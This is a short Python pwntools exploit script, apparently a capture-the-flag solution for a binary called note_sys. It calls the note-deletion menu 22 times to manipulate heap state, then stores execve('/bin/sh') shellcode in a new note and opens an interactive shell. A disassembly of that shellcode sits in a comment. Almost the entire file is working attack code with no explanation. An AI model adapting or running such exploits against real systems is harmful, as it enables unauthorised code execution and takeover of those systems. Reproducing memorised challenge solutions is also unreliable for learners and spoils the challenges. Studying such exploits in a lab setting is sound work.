from pwn import *

context.log_level = 'debug' 
context.arch = 'amd64'

p = process("./8d3f5092-148a-47ef-b9f3-f8b9b02a9137.note_sys")
# p = remote("127.0.0.1", 10000)

def newNote(content):
    p.recvuntil("choice:\n")
    p.sendline("0")
    p.recvuntil("no more than 250 characters\n")
    p.sendline(content)
    p.recvline()

def deleteNote():
    p.recvuntil("choice:\n")
    p.sendline("2")
    p.recvline()


  #  0:   6a 68                   push   0x68
  #  2:   48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f
  #  9:   2f 2f 73 
  #  c:   50                      push   rax
  #  d:   48 89 e7                mov    rdi,rsp
  # 10:   68 72 69 01 01          push   0x1016972
  # 15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp],0x1010101
  # 1c:   31 f6                   xor    esi,esi
  # 1e:   56                      push   rsi
  # 1f:   6a 08                   push   0x8
  # 21:   5e                      pop    rsi
  # 22:   48 01 e6                add    rsi,rsp
  # 25:   56                      push   rsi
  # 26:   48 89 e6                mov    rsi,rsp
  # 29:   31 d2                   xor    edx,edx
  # 2b:   6a 3b                   push   0x3b
  # 2d:   58                      pop    rax
  # 2e:   0f 05                   syscall

# if we sub 22,after malloc head will point to free
for x in xrange(0,22):
    deleteNote()

# raw_input()
payload = asm(shellcraft.sh())
# print disasm(payload)
# print payload.encode("hex")
newNote(payload)
# raw_input()

p.interactive()